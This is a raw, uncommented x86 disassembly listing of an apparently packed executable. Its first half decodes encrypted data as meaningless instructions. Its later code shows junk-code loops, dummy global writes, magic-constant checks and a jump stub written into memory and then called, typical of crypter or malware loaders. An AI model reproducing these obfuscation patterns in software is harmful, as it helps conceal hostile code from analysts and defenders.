  416c7e:	sar    DWORD PTR [esi+0x32],1
  416c81:	pop    ebx
  416c82:	add    BYTE PTR [edi+eiz*2+0x2a1907f3],bl
  416c89:	jecxz  0x416c36
  416c8b:	scas   al,BYTE PTR es:[edi]
  416c8c:	stos   DWORD PTR es:[edi],eax
  416c8d:	(bad)  
  416c8e:	dec    edx
  416c8f:	or     DWORD PTR [eax],ebp
  416c91:	fxch   st(3)
  416c93:	mov    ebp,0x5fe707b1
  416c98:	lock pop es
  416c9a:	scas   al,BYTE PTR es:[edi]
  416c9b:	rcl    bh,1
  416c9d:	xchg   eax,edi
  416c9f:	dec    esi
  416ca0:	xchg   ebp,eax
  416ca1:	and    BYTE PTR [ebx+ebp*2-0x3d02579d],dh
  416ca8:	or     dl,bh
  416caa:	fcmovbe st,st(1)
  416cac:	jl     0x416ca0
  416cae:	imul   edi,DWORD PTR [edx-0x29],0x6f
  416cb2:	dec    ecx
  416cb3:	mov    bl,0x15
  416cb5:	inc    ecx
  416cb6:	jge    0x416cc2
  416cb8:	mov    cl,0x1a
  416cba:	jmp    0xc05b:0xb1a93cab
  416cc1:	and    BYTE PTR [ebp-0x45b43995],cl
  416cc7:	leave  
  416cc8:	adc    al,0x48
  416cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ccb:	ins    BYTE PTR es:[edi],dx
  416ccc:	popa   
  416ccd:	cdq    
  416cce:	mov    esi,0xf74b64e5
  416cd3:	in     eax,dx
  416cd4:	out    0xfa,eax
  416cd6:	xchg   ebp,eax
  416cd7:	fidiv  WORD PTR [ecx]
  416cd9:	add    eax,edi
  416cdb:	push   ecx
  416cdc:	xchg   ecx,eax
  416cdd:	stos   BYTE PTR es:[edi],al
  416cde:	jp     0x416cae
  416ce0:	mov    DWORD PTR es:[esi-0x3873b18],edi
  416ce7:	push   es
  416ce8:	pusha  
  416ce9:	jmp    0xe78b:0x5642f951
  416cf0:	shl    BYTE PTR [ecx+esi*2-0x52],1
  416cf4:	pop    edx
  416cf5:	ret    
  416cf6:	leave  
  416cf7:	dec    esi
  416cf8:	out    dx,eax
  416cf9:	pop    edi
  416cfa:	push   0x57
  416cfc:	sub    ch,BYTE PTR [ebx-0x369d4ce3]
  416d02:	inc    esp
  416d03:	sub    al,0x5b
  416d05:	sub    ah,dl
  416d07:	xchg   BYTE PTR [eax+0x1f448fab],cl
  416d0d:	pop    ecx
  416d0e:	cwde   
  416d0f:	(bad)  
  416d10:	arpl   WORD PTR [edx],bp
  416d12:	cdq    
  416d13:	hlt    
  416d14:	pop    ebp
  416d15:	or     BYTE PTR [edx],0x42
  416d18:	add    eax,0xacc8886b
  416d1d:	int    0x72
  416d1f:	fsub   QWORD PTR [esi+0x48049a98]
  416d25:	pop    ebp
  416d26:	retf   0x3bf
  416d29:	mov    ds:0xcc4f0f5a,eax
  416d2e:	sbb    edi,DWORD PTR ds:0x8b98d566
  416d34:	adc    DWORD PTR [esi-0x383bcc8d],ebx
  416d3a:	outs   dx,DWORD PTR ds:[esi]
  416d3b:	es int 0xa1
  416d3e:	dec    edi
  416d3f:	jge    0x416cda
  416d41:	ds push cs
  416d43:	cdq    
  416d44:	cmc    
  416d45:	dec    esp
  416d46:	je     0x416cfa
  416d48:	aad    0x68
  416d4a:	push   edi
  416d4b:	inc    esi
  416d4c:	adc    DWORD PTR [edi+0x6ff678f4],esp
  416d52:	rcl    DWORD PTR [ebp+0x45d2d791],0x8f
  416d59:	retf   0x48a8
  416d5c:	sbb    cl,BYTE PTR [ebx]
  416d5e:	dec    ecx
  416d5f:	pop    ecx
  416d60:	stos   BYTE PTR es:[edi],al
  416d61:	mov    edi,0x95255cc1
  416d66:	add    cl,BYTE PTR [ecx+esi*4-0xcb1b0b5]
  416d6d:	dec    ecx
  416d6e:	pop    ss
  416d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d70:	and    bh,dl
  416d72:	aas    
  416d73:	in     eax,0x3c
  416d75:	icebp  
  416d76:	stos   BYTE PTR es:[edi],al
  416d77:	sahf   
  416d78:	mov    DWORD PTR [ecx-0x69118032],ebx
  416d7e:	inc    edx
  416d7f:	mov    cl,0xf9
  416d81:	push   0x21060376
  416d86:	push   edi
  416d87:	jg     0x416dac
  416d89:	push   0xffffff89
  416d8b:	dec    esp
  416d8c:	scas   eax,DWORD PTR es:[edi]
  416d8d:	push   ds
  416d8e:	test   eax,0xa2c346b1
  416d93:	inc    ebx
  416d94:	pop    es
  416d95:	push   eax
  416d96:	out    0xbf,eax
  416d98:	jl     0x416dca
  416d9a:	sbb    DWORD PTR [ecx+0x46],ecx
  416d9d:	pushf  
  416d9e:	shl    cl,cl
  416da0:	outs   dx,DWORD PTR ds:[esi]
  416da1:	ja     0x416d92
  416da3:	xor    ebx,edx
  416da5:	out    0x51,eax
  416da7:	xor    al,BYTE PTR [ecx+0x69]
  416daa:	push   edi
  416dab:	stos   BYTE PTR es:[edi],al
  416dac:	or     DWORD PTR [esi-0x7b894a51],ecx
  416db2:	jbe    0x416df3
  416db4:	sub    dh,dl
  416db6:	lahf   
  416db7:	push   ss
  416db8:	loopne 0x416d41
  416dba:	dec    eax
  416dbb:	daa    
  416dbc:	sub    eax,0x4b1c6c98
  416dc1:	adc    eax,0x91aef40f
  416dc6:	pop    edi
  416dc7:	cmp    eax,edi
  416dc9:	lods   eax,DWORD PTR ds:[esi]
  416dca:	dec    eax
  416dcb:	mov    al,0xa6
  416dcd:	(bad)  
  416dce:	push   ebx
  416dcf:	les    edi,FWORD PTR [edx]
  416dd1:	sub    ecx,DWORD PTR [ecx-0x48]
  416dd4:	cmp    al,0xc9
  416dd6:	cs aaa 
  416dd8:	cmc    
  416dd9:	int3   
  416dda:	loope  0x416d84
  416ddc:	mov    ds:0xd3f89eec,al
  416de1:	xor    BYTE PTR [eax+ebx*2+0x7b],al
  416de5:	jecxz  0x416e63
  416de7:	mov    ds:0x4f540607,eax
  416dec:	pop    es
  416ded:	loope  0x416dc3
  416def:	aad    0xf4
  416df1:	dec    esp
  416df2:	jecxz  0x416e50
  416df4:	stos   DWORD PTR es:[edi],eax
  416df5:	xor    BYTE PTR [eax+0x2db53b90],al
  416dfb:	jp     0x416db7
  416dfd:	mov    esi,0x39521123
  416e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e03:	sbb    edx,0xffffff8c
  416e06:	mov    esi,0xf61dc3e
  416e0b:	lea    ecx,[ebx+0x5d]
  416e0e:	cwde   
  416e0f:	cmc    
  416e10:	or     DWORD PTR [edx],eax
  416e12:	mov    dh,0x3e
  416e14:	arpl   WORD PTR [ebp+0x185146d2],bp
  416e1a:	out    dx,al
  416e1b:	outs   dx,BYTE PTR ds:[esi]
  416e1c:	arpl   si,dx
  416e1e:	repnz sub eax,0x4526680e
  416e24:	jo     0x416e4c
  416e26:	popf   
  416e27:	push   es
  416e28:	pop    DWORD PTR [edx-0x19]
  416e2b:	imul   esi,edx,0xee352614
  416e31:	mov    ch,0xc8
  416e33:	cld    
  416e34:	lods   al,BYTE PTR ds:[esi]
  416e35:	in     eax,dx
  416e36:	inc    eax
  416e37:	mov    cl,ah
  416e39:	mov    cl,0x73
  416e3b:	in     al,dx
  416e3c:	and    BYTE PTR [edx+0x15],bl
  416e3f:	or     DWORD PTR [esi+0xc],edi
  416e42:	ffree  st(4)
  416e44:	call   ecx
  416e46:	dec    ecx
  416e47:	inc    ecx
  416e48:	out    dx,al
  416e49:	(bad)  
  416e4a:	ja     0x416e24
  416e4c:	or     al,0x1f
  416e4e:	into   
  416e4f:	sub    al,0x57
  416e51:	cmp    ebp,DWORD PTR [edx+0x2a]
  416e54:	loope  0x416e28
  416e56:	out    dx,eax
  416e57:	and    BYTE PTR [ebx+0x24],bl
  416e5a:	fwait
  416e5b:	into   
  416e5c:	inc    esi
  416e5d:	les    edi,FWORD PTR [edx+0x23]
  416e60:	ror    DWORD PTR [esi],0x1b
  416e63:	xor    DWORD PTR [ebp+0x4e],0x141b9626
  416e6a:	sub    DWORD PTR [eax-0xc66e6ea],esi
  416e70:	dec    ebp
  416e71:	lods   al,BYTE PTR ds:[esi]
  416e72:	in     al,0xcf
  416e74:	(bad)  
  416e75:	mov    ebx,0x1920ee6a
  416e7a:	es inc eax
  416e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e7d:	das    
  416e7e:	ret    
  416e7f:	out    dx,al
  416e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e81:	mov    cl,0x58
  416e83:	lods   al,BYTE PTR ds:[esi]
  416e84:	call   0x44ea3140
  416e89:	loopne 0x416ee8
  416e8b:	mov    bl,0xfa
  416e8d:	dec    ecx
  416e8e:	jnp    0x416e22
  416e90:	in     al,dx
  416e91:	std    
  416e92:	mov    bl,0x97
  416e94:	mov    eax,esi
  416e96:	mov    ebp,0x41e7e3b0
  416e9b:	dec    ebx
  416e9c:	shr    DWORD PTR [ecx+0x5c],cl
  416e9f:	and    eax,0x66a27c84
  416ea4:	jp     0x416f15
  416ea6:	popf   
  416ea7:	fwait
  416ea8:	sub    DWORD PTR [ecx],edx
  416eaa:	ds xor ecx,edx
  416ead:	int3   
  416eae:	xor    edi,DWORD PTR [edi]
  416eb0:	and    BYTE PTR [ecx-0x64],ah
  416eb3:	jmp    0x416e62
  416eb5:	fldenv [ecx]
  416eb7:	push   0xf49c6cba
  416ebc:	or     edi,esi
  416ebe:	jge    0x416e86
  416ec0:	frstor [ebx-0x33fe4154]
  416ec6:	mov    ecx,0x9b71cda1
  416ecb:	mov    al,ds:0x97ac815c
  416ed0:	aaa    
  416ed1:	jae    0x416e91
  416ed3:	and    eax,0xdcb6c0a
  416ed9:	and    edx,ebp
  416edb:	mov    ecx,0xbfb85960
  416ee0:	inc    di
  416ee2:	or     eax,0x8aff5d8a
  416ee7:	loopne 0x416ece
  416ee9:	cs xor eax,0xf5ddace3
  416eef:	mov    al,0xff
  416ef1:	scas   al,BYTE PTR es:[di]
  416ef3:	lahf   
  416ef4:	inc    esi
  416ef5:	push   eax
  416ef6:	arpl   bp,bx
  416ef8:	inc    esp
  416ef9:	enter  0x544d,0x47
  416efd:	fwait
  416efe:	dec    esp
  416eff:	add    al,BYTE PTR [esi+0x2311cdc6]
  416f05:	inc    eax
  416f06:	sub    al,0x2d
  416f08:	pop    es
  416f09:	pop    esi
  416f0a:	xchg   esp,eax
  416f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f0c:	aas    
  416f0d:	push   ebp
  416f0e:	inc    ecx
  416f0f:	stos   BYTE PTR es:[edi],al
  416f10:	bound  ebp,QWORD PTR [ebp-0x3ea10631]
  416f16:	sbb    eax,0x746e4176
  416f1b:	and    eax,0xeaeae5c6
  416f20:	enter  0x480d,0x4f
  416f24:	mov    ebp,0xc0cb091
  416f29:	xor    eax,0x662254c8
  416f2e:	sti    
  416f2f:	and    eax,0xbb98c4c
  416f34:	mov    eax,ds:0xfffd29f
  416f39:	enter  0x6082,0xed
  416f3d:	and    bl,BYTE PTR [ebx-0x11e6e2e6]
  416f43:	test   BYTE PTR [edi],dl
  416f45:	inc    ebp
  416f46:	stc    
  416f47:	mov    ch,cl
  416f49:	add    al,0x61
  416f4b:	icebp  
  416f4c:	adc    ebx,0x74
  416f4f:	stc    
  416f50:	pop    edi
  416f51:	and    edx,esi
  416f53:	xchg   esp,eax
  416f54:	sub    BYTE PTR [eax+0x32af394f],cl
  416f5a:	adc    ch,dh
  416f5c:	push   edi
  416f5d:	add    BYTE PTR [eax],dh
  416f5f:	inc    ecx
  416f60:	fldenv ds:0x45469a10
  416f66:	xchg   ecx,eax
  416f67:	mov    bh,0x7a
  416f69:	repz dec eax
  416f6b:	jmp    0x416f2d
  416f6d:	jecxz  0x416fc1
  416f6f:	sbb    al,0x77
  416f71:	fwait
  416f72:	pop    ecx
  416f73:	aas    
  416f74:	xor    eax,0x3c80be07
  416f79:	mov    DWORD PTR [ebx+0x388eb570],0x86d8206d
  416f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f84:	xchg   ecx,eax
  416f85:	popf   
  416f86:	mov    BYTE PTR [ecx],cl
  416f88:	fnstenv [edx]
  416f8a:	std    
  416f8b:	sbb    eax,0xcac47236
  416f90:	mov    ch,0x60
  416f92:	jp     0x417010
  416f94:	(bad)  
  416f95:	stc    
  416f96:	int3   
  416f97:	dec    edx
  416f98:	out    0xf1,al
  416f9a:	jae    0x416f5f
  416f9c:	ja     0x416fd2
  416f9e:	mov    bh,0x31
  416fa0:	inc    edx
  416fa1:	in     eax,dx
  416fa2:	inc    esi
  416fa3:	mov    ds,WORD PTR [ebx+esi*1]
  416fa6:	out    dx,eax
  416fa7:	push   esi
  416fa8:	mov    bl,BYTE PTR [ebp+0xb]
  416fab:	pusha  
  416fac:	dec    ecx
  416fad:	mov    bh,0x33
  416faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb0:	jmp    0x7c9:0x327e2e6f
  416fb7:	mov    esp,0x420edc84
  416fbc:	test   DWORD PTR [esi-0x5aff2858],0x30338a98
  416fc6:	or     BYTE PTR [ebp-0x4bdf8896],cl
  416fcc:	cdq    
  416fcd:	inc    ecx
  416fce:	xor    al,0xe4
  416fd0:	inc    ebx
  416fd1:	cmp    DWORD PTR [esi+0x5d603c5f],ebx
  416fd7:	test   al,0x35
  416fd9:	outs   dx,DWORD PTR ds:[esi]
  416fda:	and    esp,DWORD PTR [esi]
  416fdc:	jmp    0x5a0d:0x6f3bf495
  416fe3:	jbe    0x417062
  416fe5:	add    cl,BYTE PTR [ebp+0x64]
  416fe8:	rcl    bl,1
  416fea:	and    BYTE PTR [ecx+0x697a9576],dh
  416ff0:	daa    
  416ff1:	call   0x216a:0x5fc391d3
  416ff8:	aad    0xda
  416ffa:	push   0x38
  416ffc:	hlt    
  416ffd:	test   DWORD PTR [ecx],edi
  416fff:	sbb    esi,DWORD PTR [esp+ebx*1]
  417002:	xchg   ebp,eax
  417003:	(bad)  
  417004:	shl    DWORD PTR [esp+edx*1+0x76],cl
  417008:	and    al,0x9
  41700a:	loop   0x417080
  41700c:	adc    dl,ah
  41700e:	int3   
  41700f:	popf   
  417010:	jmp    0x417069
  417012:	jno    0x416fbe
  417014:	lahf   
  417015:	int3   
  417016:	and    BYTE PTR [eax+0x35da7eb0],dl
  41701c:	ficom  DWORD PTR [ebx+0x45]
  41701f:	add    eax,0xbe9e7a9a
  417024:	pop    ecx
  417025:	push   0x34
  417027:	sub    al,0x33
  417029:	jmp    0x6427:0xa527dc82
  417030:	inc    ebp
  417031:	pop    ss
  417032:	shl    dl,cl
  417034:	and    BYTE PTR [ebp-0x73],ah
  417037:	mov    ecx,0xeb7200f1
  41703c:	dec    esi
  41703d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41703e:	dec    esp
  41703f:	sub    BYTE PTR [esi+0x34],dl
  417042:	pop    ebp
  417043:	xchg   edi,eax
  417044:	stc    
  417045:	mov    esp,0x78dc5273
  41704a:	sar    BYTE PTR [edi-0x1f],1
  41704d:	dec    eax
  41704e:	adc    al,0xa1
  417050:	(bad)  
  417052:	cmp    bl,BYTE PTR [edi-0x54]
  417055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417056:	sub    BYTE PTR [ecx+0x1281184b],0x44
  41705d:	mov    edx,0xc7e6f112
  417062:	(bad)  
  417063:	das    
  417064:	jge    0x41701e
  417066:	in     eax,dx
  417067:	jl     0x4170b5
  417069:	xchg   ecx,eax
  41706a:	or     BYTE PTR [edi],ah
  41706c:	sahf   
  41706d:	fisubr WORD PTR [edx+0x30]
  417070:	push   es
  417071:	inc    esp
  417072:	and    DWORD PTR [edi-0x56],0x6b
  417076:	sub    al,0xe5
  417078:	rcl    DWORD PTR [edx+0x54],1
  41707b:	(bad)  
  41707c:	hlt    
  41707d:	inc    eax
  41707e:	addr16 or edx,esi
  417081:	inc    ecx
  417082:	mov    edx,0xbce699a6
  417087:	or     DWORD PTR [ebx+0x2],edx
  41708a:	jmp    0x8dd1:0x6c6ebaf5
  417091:	scas   eax,DWORD PTR es:[edi]
  417092:	pop    ebx
  417093:	sbb    esi,DWORD PTR [ebx+0x78]
  417096:	sub    BYTE PTR [ebx-0x26],dh
  417099:	sub    BYTE PTR [ebx+0x6c],0x1f
  41709d:	sub    esi,edx
  41709f:	popf   
  4170a0:	sbb    eax,ecx
  4170a2:	mov    ds:0x72bb1eb2,al
  4170a7:	mov    al,ds:0xe2ff6af0
  4170ac:	cmp    DWORD PTR [eax+edi*2],ecx
  4170af:	mov    ecx,0x959bd26b
  4170b4:	mov    BYTE PTR [ebx],cl
  4170b6:	shr    DWORD PTR [ebx+eiz*4],cl
  4170b9:	pop    ecx
  4170ba:	ins    DWORD PTR es:[edi],dx
  4170bb:	push   0xffffffcc
  4170bd:	adc    al,0x4d
  4170bf:	jle    0x4170a2
  4170c1:	mov    bh,0x6e
  4170c3:	mov    cl,0xc0
  4170c5:	call   DWORD PTR [edi-0x1699682a]
  4170cb:	jg     0x417109
  4170cd:	call   0xae41:0x15c091f1
  4170d4:	nop
  4170d5:	push   ebp
  4170d6:	leave  
  4170d7:	dec    esi
  4170d8:	push   ebp
  4170d9:	mov    eax,0x4ed1827c
  4170de:	push   eax
  4170df:	out    dx,eax
  4170e0:	nop
  4170e1:	adc    esp,ecx
  4170e3:	popa   
  4170e4:	paddq  mm4,QWORD PTR [edx+0x7]
  4170e8:	icebp  
  4170e9:	(bad)  [esi-0x17768794]
  4170ef:	fst    DWORD PTR [ecx+0x26]
  4170f2:	stos   DWORD PTR es:[edi],eax
  4170f3:	je     0x41707c
  4170f5:	je     0x4170cb
  4170f7:	rol    BYTE PTR [edi],1
  4170f9:	std    
  4170fa:	and    DWORD PTR [ebp-0x548436cc],ebx
  417100:	push   es
  417101:	rol    DWORD PTR [eax],1
  417103:	inc    edi
  417104:	stos   BYTE PTR es:[edi],al
  417105:	add    cl,cl
  417107:	sub    ebx,DWORD PTR [edi+0x22]
  41710a:	inc    DWORD PTR [ecx-0x54d60bbe]
  417110:	mov    esp,0xa64c2f3d
  417115:	xchg   edx,eax
  417116:	mov    bh,0x9a
  417118:	push   edi
  417119:	mov    BYTE PTR [edx-0x6a45612e],dh
  41711f:	(bad)  
  417120:	pushf  
  417121:	xor    BYTE PTR [eax+0x4589c12b],cl
  417127:	clc    
  417128:	mov    ecx,DWORD PTR [ebp-0x4]
  41712b:	xor    ecx,esi
  41712d:	mov    eax,0xffcd8d08
  417132:	sub    eax,ecx
  417134:	add    DWORD PTR [ebp-0x8],eax
  417137:	mov    eax,DWORD PTR [ebp-0x14]
  41713a:	mov    DWORD PTR [eax],0x675565e9
  417140:	mov    DWORD PTR [eax+0x4],0x76576787
  417147:	mov    eax,DWORD PTR [ebp-0x8]
  41714a:	mov    ecx,DWORD PTR [ebp-0x14]
  41714d:	push   DWORD PTR [ebp-0x24]
  417150:	mov    DWORD PTR [ecx+0x1],eax
  417153:	mov    eax,ds:0x4281e1
  417158:	push   DWORD PTR [eax]
  41715a:	push   DWORD PTR ds:0x428445
  417160:	push   DWORD PTR ds:0x4281e9
  417166:	push   DWORD PTR ds:0x428425
  41716c:	push   DWORD PTR ds:0x428c15
  417172:	push   DWORD PTR [ebp-0x28]
  417175:	push   DWORD PTR [ebp-0x2c]
  417178:	mov    eax,DWORD PTR [ebp-0x14]
  41717b:	call   eax
  41717d:	pop    edi
  41717e:	pop    esi
  41717f:	leave  
  417180:	ret    
  417181:	push   ebp
  417182:	mov    ebp,esp
  417184:	sub    esp,0x34
  417187:	add    DWORD PTR ds:0x428e9d,ebx
  41718d:	push   ebx
  41718e:	push   esi
  41718f:	movzx  esi,WORD PTR ds:0x428e39
  417196:	or     DWORD PTR ds:0x428e31,esi
  41719c:	push   edi
  41719d:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  4171a4:	lea    eax,[ebp+0x14]
  4171a7:	mov    DWORD PTR [ebp-0x4],eax
  4171aa:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  4171b1:	sub    ecx,DWORD PTR ds:0x428eb9
  4171b7:	lea    eax,[ebp-0xc]
  4171ba:	xor    edx,ecx
  4171bc:	mov    DWORD PTR [ebp-0x14],eax
  4171bf:	and    DWORD PTR ds:0x428e39,0x0
  4171c9:	jmp    0x4171db
  4171ce:	mov    ecx,DWORD PTR ds:0x428e39
  4171d4:	inc    ecx
  4171d5:	mov    DWORD PTR ds:0x428e39,ecx
  4171db:	cmp    DWORD PTR ds:0x428e39,0x18
  4171e2:	jae    0x417215
  4171e8:	cmp    DWORD PTR ds:0x428e39,0x1b
  4171ef:	jbe    0x417215
  4171f5:	jmp    0x417210
  4171fa:	push   0x39b5
  4171ff:	push   DWORD PTR [ebp-0x14]
  417202:	push   DWORD PTR [ebp-0x14]
  417205:	push   0x5237
  41720a:	call   DWORD PTR ds:0x42ca3c
  417210:	jmp    0x4171ce
  417215:	mov    eax,DWORD PTR [ebp-0xc]
  417218:	mov    edx,DWORD PTR [ebp-0x14]
  41721b:	or     DWORD PTR ds:0x428e85,edx
  417221:	mov    ecx,0x75108b1
  417226:	xor    eax,ecx
  417228:	dec    DWORD PTR ds:0x428e85
  41722e:	add    eax,0x3272f8
  417233:	and    DWORD PTR ds:0x428eb5,0x0
  41723d:	jmp    0x41724f
  417242:	mov    esi,DWORD PTR ds:0x428eb5
  417248:	inc    esi
  417249:	mov    DWORD PTR ds:0x428eb5,esi
  41724f:	cmp    DWORD PTR ds:0x428eb5,0x19
  417256:	jae    0x41729d
  41725c:	cmp    DWORD PTR ds:0x428eb5,0x9
  417263:	jl     0x41729d
  417269:	jmp    0x41727e
  41726e:	push   0x428019
  417273:	push   0x1
  417275:	push   DWORD PTR [ebp-0x24]
  417278:	call   DWORD PTR ds:0x42ca4c
  41727e:	cmp    DWORD PTR ds:0x428eb5,0x8
  417285:	jne    0x417298
  41728b:	mov    esi,DWORD PTR ds:0x428eb5
  417291:	inc    esi
  417292:	mov    DWORD PTR ds:0x428eb5,esi
  417298:	jmp    0x417242
  41729d:	mov    DWORD PTR [edx],eax
  41729f:	mov    eax,ds:0x4281dd
  4172a4:	mov    edx,DWORD PTR [ebp-0x4]
  4172a7:	mov    eax,DWORD PTR [eax]
  4172a9:	mov    DWORD PTR ds:0x428ecd,0x15
  4172b3:	cmp    DWORD PTR ds:0x428ecd,0x0
  4172ba:	je     0x417309
  4172c0:	cmp    DWORD PTR ds:0x428ecd,0x6
  4172c7:	jg     0x417309
  4172cd:	jmp    0x4172dd
  4172d2:	push   0x50d0
  4172d7:	call   DWORD PTR ds:0x42ca50
  4172dd:	cmp    DWORD PTR ds:0x428ecd,0x7
  4172e4:	jne    0x4172f7
  4172ea:	mov    esi,DWORD PTR ds:0x428ecd
  4172f0:	dec    esi
  4172f1:	mov    DWORD PTR ds:0x428ecd,esi
  4172f7:	mov    esi,DWORD PTR ds:0x428ecd
  4172fd:	dec    esi
  4172fe:	mov    DWORD PTR ds:0x428ecd,esi
  417304:	jmp    0x4172b3
  417309:	add    eax,DWORD PTR [edx]
  41730b:	mov    DWORD PTR [ebp-0x8],eax
  41730e:	mov    esi,DWORD PTR [ebp+0x8]
  417311:	sbb    DWORD PTR ds:0x428e71,ebx
  417317:	mov    eax,ds:0x428365
  41731c:	mov    DWORD PTR ds:0x428e8d,0x5de4
  417326:	mov    eax,DWORD PTR [eax+0x198]
  41732c:	and    DWORD PTR ds:0x428eb1,0x0
  417336:	jmp    0x417348
  41733b:	mov    edx,DWORD PTR ds:0x428eb1
  417341:	inc    edx
  417342:	mov    DWORD PTR ds:0x428eb1,edx
  417348:	cmp    DWORD PTR ds:0x428eb1,0x1b
  41734f:	jae    0x41737f
  417355:	cmp    DWORD PTR ds:0x428eb1,0x26
  41735c:	jle    0x41737f
  417362:	jmp    0x41737a
  417367:	push   DWORD PTR [ebp-0x14]
  41736a:	push   0x42819a
  41736f:	push   0x428e5d
  417374:	call   DWORD PTR ds:0x42ca54
  41737a:	jmp    0x41733b
  41737f:	xor    esi,ecx
  417381:	and    DWORD PTR ds:0x428ec1,0x0
  41738b:	jmp    0x41739d
  417390:	mov    edx,DWORD PTR ds:0x428ec1
  417396:	inc    edx
  417397:	mov    DWORD PTR ds:0x428ec1,edx
  41739d:	cmp    DWORD PTR ds:0x428ec1,0x1c
  4173a4:	jae    0x4173f1
  4173aa:	cmp    DWORD PTR ds:0x428ec1,0x8
  4173b1:	jb     0x4173f1
  4173b7:	jmp    0x4173d2
  4173bc:	push   DWORD PTR [ebp-0x24]
  4173bf:	push   0x14a9
  4173c4:	push   0x3838
  4173c9:	push   DWORD PTR [ebp-0x20]
  4173cc:	call   DWORD PTR ds:0x42ca58
  4173d2:	cmp    DWORD PTR ds:0x428ec1,0x7
  4173d9:	jne    0x4173ec
  4173df:	mov    edx,DWORD PTR ds:0x428ec1
  4173e5:	inc    edx
  4173e6:	mov    DWORD PTR ds:0x428ec1,edx
  4173ec:	jmp    0x417390
  4173f1:	mov    edx,0x3272f8
  4173f6:	or     DWORD PTR ds:0x428e59,0x2d0a
  417400:	add    esi,edx
  417402:	mov    DWORD PTR ds:0x428e4d,0x9a6
  41740c:	cmp    DWORD PTR [eax],esi
  41740e:	mov    DWORD PTR ds:0x428e65,0x2339
  417418:	je     0x41742f
  41741e:	mov    eax,DWORD PTR [eax]
  417420:	mov    DWORD PTR ds:0x428ebd,0x152e
  41742a:	jmp    0x41e3db
  41742f:	sbb    esi,eax
  417431:	mov    eax,DWORD PTR [ebp+0x18]
  417434:	mov    esi,DWORD PTR ds:0x428e2d
  41743a:	adc    DWORD PTR ds:0x428e61,esi
  417440:	mov    esi,DWORD PTR [ebp+0x1c]
  417443:	or     ebx,0xffffffff
  417446:	mov    DWORD PTR ds:0x428ed1,0x15d
  417450:	cmp    eax,0x70941f8a
  417455:	mov    DWORD PTR ds:0x428e8d,0x42c3
  41745f:	jne    0x4174aa
  417465:	mov    DWORD PTR ds:0x428e2d,0x1eb5
  41746f:	cmp    esi,ebx
  417471:	mov    DWORD PTR ds:0x428ead,0x35c3
  41747b:	jne    0x4174aa
  417481:	mov    DWORD PTR ds:0x428e65,0x33a3
  41748b:	push   ebx
  41748c:	mov    DWORD PTR ds:0x428e49,0x2fe2
  417496:	push   0x70941f94
  41749b:	mov    DWORD PTR ds:0x428e41,0x2336
  4174a5:	jmp    0x41e3ca
  4174aa:	mov    DWORD PTR ds:0x428ea5,ebx
  4174b0:	mov    eax,DWORD PTR [ebp+0x18]
  4174b3:	mov    esi,DWORD PTR [ebp+0x1c]
  4174b6:	cmp    eax,0x70941f94
  4174bb:	mov    DWORD PTR ds:0x428e61,0x2bd8
  4174c5:	jne    0x4174f2
  4174cb:	cmp    esi,ebx
  4174cd:	mov    DWORD PTR ds:0x428e2d,0x15b3
  4174d7:	jne    0x4174f2
  4174dd:	push   ebx
  4174de:	mov    DWORD PTR ds:0x428e75,0x4e72
  4174e8:	push   0x70941f96
  4174ed:	jmp    0x41e3ca
  4174f2:	mov    eax,ds:0x428e59
  4174f7:	mov    eax,DWORD PTR [ebp+0x18]
  4174fa:	mov    esi,DWORD PTR [ebp+0x1c]
  4174fd:	cmp    eax,0x70941f96
  417502:	jne    0x417543
  417508:	mov    DWORD PTR ds:0x428e99,0x434f
  417512:	cmp    esi,ebx
  417514:	jne    0x417543
  41751a:	mov    DWORD PTR ds:0x428ec9,0x341e
  417524:	push   ebx
  417525:	mov    DWORD PTR ds:0x428e85,0x3720
  41752f:	push   0x70941f90
  417534:	mov    DWORD PTR ds:0x428eb1,0x674c
  41753e:	jmp    0x41e3ca
  417543:	mov    eax,DWORD PTR [ebp+0x18]
  417546:	mov    esi,DWORD PTR [ebp+0x1c]
  417549:	mov    DWORD PTR ds:0x428e69,0x6330
  417553:	cmp    eax,0x70941f90
  417558:	jne    0x417599
  41755e:	cmp    esi,ebx
  417560:	mov    DWORD PTR ds:0x428e45,0x5688
  41756a:	jne    0x417599
  417570:	mov    DWORD PTR ds:0x428e69,0x61b3
  41757a:	push   ebx
  41757b:	mov    DWORD PTR ds:0x428e4d,0x6bb8
  417585:	push   0x70941f92
  41758a:	mov    DWORD PTR ds:0x428e2d,0x777c
  417594:	jmp    0x41e3ca
  417599:	mov    eax,DWORD PTR [ebp+0x18]
  41759c:	mov    edi,DWORD PTR ds:0x428e89
  4175a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4175a5:	mov    edi,0x70941f9e
  4175aa:	mov    DWORD PTR ds:0x428ea1,0x2f43
  4175b4:	cmp    eax,edi
  4175b6:	mov    DWORD PTR ds:0x428eb1,0x498f
  4175c0:	jne    0x41e38b
  4175c6:	cmp    esi,ebx
  4175c8:	mov    DWORD PTR ds:0x428e71,0x5df9
  4175d2:	jne    0x41e38b
  4175d8:	sbb    eax,eax
  4175da:	mov    eax,DWORD PTR [ebp+0x10]
  4175dd:	and    DWORD PTR ds:0x428ea9,0x0
  4175e7:	jmp    0x4175fb
  4175ec:	xor    esi,esi
  4175ee:	xor    esi,DWORD PTR ds:0x428ea9
  4175f4:	inc    esi
  4175f5:	mov    DWORD PTR ds:0x428ea9,esi
  4175fb:	cmp    DWORD PTR ds:0x428ea9,0x1f
  417602:	jae    0x417655
  417608:	cmp    DWORD PTR ds:0x428ea9,0x5
  41760f:	jge    0x417655
  417615:	jmp    0x417636
  41761a:	push   DWORD PTR [ebp-0x10]
  41761d:	push   DWORD PTR [ebp-0x24]
  417620:	push   DWORD PTR [ebp-0x28]
  417623:	push   0x8725
  417628:	push   0x42814e
  41762d:	push   DWORD PTR [ebp-0x14]
  417630:	call   DWORD PTR ds:0x42ca10
